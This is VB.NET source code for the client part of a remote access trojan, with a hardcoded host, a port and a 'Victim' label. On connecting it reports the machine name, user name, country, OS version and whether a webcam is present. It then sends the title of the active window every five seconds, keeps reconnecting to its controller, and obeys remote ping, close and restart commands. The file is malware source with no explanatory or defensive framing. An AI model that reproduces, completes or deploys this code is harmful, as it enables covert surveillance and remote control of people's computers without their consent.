Imports System.Collections.Generic
Imports System.Threading
Imports System.Runtime.InteropServices
Imports System.Diagnostics
Imports System.Windows.Forms
Public Module a
    Public h As String = "127.0.0.1"
    Public port As Integer = 127
    Public Name As String = "Victim"
    Public Y As String = "/j|n\"
    Public Ver As String = "0.1"
    Public F As New Microsoft.VisualBasic.Devices.Computer
    Public C As New TCP
    Public EXE As New IO.FileInfo(Application.ExecutablePath)
    Public Sub main()
        Dim oldwindow As String = ""
        While True
            Thread.CurrentThread.Sleep(5000)
            Dim s = ACT()
            If s <> oldwindow Then
                oldwindow = s
                C.Send("!1" & Y & s)
            End If
        End While
    End Sub
    Public Sub IND(ByVal b As Byte())
        Dim A As String() = Split(BS(b), Y)
        Select Case A(0)
            Case "ping"
                C.Send("ping")
            Case "Close"
                End
            Case "Restart"
                Process.Start(EXE.FullName)
                End
        End Select
    End Sub
    Public Function INF() As String
        Dim x As String = Name & Y
        ' get pc name
        Try
            x &= Environment.MachineName & Y
        Catch ex As Exception
            x &= "??" & Y
        End Try
        ' get User name
        Try
            x &= Environment.UserName & Y
        Catch ex As Exception
            x &= "??" & Y
        End Try
        ' get Country
        x &= Gcc() & Y
        ' Get OS
        Try
            x += F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
        Catch ex As Exception
            x += "??" '& Y
        End Try
        x += "SP"
        Try
            Dim k As String() = Split(Environment.OSVersion.ServicePack, " ")
            If k.Length = 1 Then
                x &= "0"
            End If
            x &= k(k.Length - 1)
        Catch ex As Exception
            x &= "0"
        End Try
        Try
            If Environment.GetFolderPath(38).Contains("x86") Then
                x += " x64" & Y
            Else
                x += " x86" & Y
            End If
        Catch ex As Exception
            x += Y
        End Try
        ' cam
        If Cam() Then
            x &= "Yes" & Y
        Else
            x &= "No" & Y
        End If
        ' version
        x &= Ver & Y
        ' ping
        x &= "" & Y
        x &= ACT() & Y
        Return x
    End Function
    '====================================== Window API
    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr ' Get Active window Handle
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
    Public Function ACT() As String ' Get Active Window Text
        Try
            Dim h As IntPtr = GetForegroundWindow()
            If h = IntPtr.Zero Then
                Return ""
            End If
            Dim w As Integer
            w = GetWindowTextLength(h)
            Dim t As String = StrDup(w + 1, "*")
            GetWindowText(h, t, w + 1)
            Dim pid As Integer
            GetWindowThreadProcessId(h, pid)
            If pid = 0 Then
                Return t
            Else
                Try
                    Return Diagnostics.Process.GetProcessById(pid).MainWindowTitle()
                Catch ex As Exception
                    Return t
                End Try
            End If
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Public Function BS(ByVal b As Byte()) As String ' bytes to String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Public Function SB(ByVal s As String) As Byte() ' String to bytes
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    '=============================== PC Country
    <DllImport("kernel32.dll")> _
    Private Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
    End Function
    Public Function Gcc() As String
        Try
            Dim d = New System.Text.StringBuilder(256)
            Dim i As Integer = GetLocaleInfo(&H400, &H7, d, d.Capacity)
            If i > 0 Then
                Return d.ToString().Substring(0, i - 1)
            End If
        Catch ex As Exception
        End Try
        Return "X"
    End Function
    '=============================== Cam Drivers
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
    ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
    ByVal cbVer As Integer) As Boolean
    Public Function Cam() As Boolean
        Try
            Dim d As String = Space(100)
            For i As Integer = 0 To 4
                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
                    Return True
                End If
            Next
        Catch ex As Exception
        End Try
        Return False
    End Function
End Module
Public Class TCP
    Public SPL As String = "[endof]"
    Public C As Net.Sockets.TcpClient
    Sub New()
        Dim t As New Threading.Thread(AddressOf RC)
        t.Start()
    End Sub
    Public Sub Send(ByVal b As Byte())
        If CN = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(SPL), 0, SPL.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            CN = False
        End Try
    End Sub
    Public Sub Send(ByVal S As String)
        Send(SB(S))
    End Sub
    Private CN As Boolean = False
    Sub RC()
        Dim M As New IO.MemoryStream ' create memory stream
        Dim lp As Integer = 0
re:
        Try
            If C Is Nothing Then GoTo e
            If C.Client.Connected = False Then GoTo e
            If CN = False Then GoTo e
            lp += 1
            If lp > 500 Then
                lp = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(SPL) Then ' split packet..
                    Dim A As Array = fx(M.ToArray, SPL)
                    Dim T As New Thread(AddressOf IND)
                    T.Start(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
e:      ' clear things and ReConnect
        CN = False
        Try
            C.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            M.Dispose()
        Catch ex As Exception
        End Try
        M = New IO.MemoryStream
        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            lp = 0
            C.Client.Connect(h, port)
            CN = True
            Send("!0" & Y & INF()) ' Send My INFO after connect
        Catch ex As Exception
            Threading.Thread.CurrentThread.Sleep(2500)
            GoTo e
        End Try
        GoTo re
    End Sub
End Class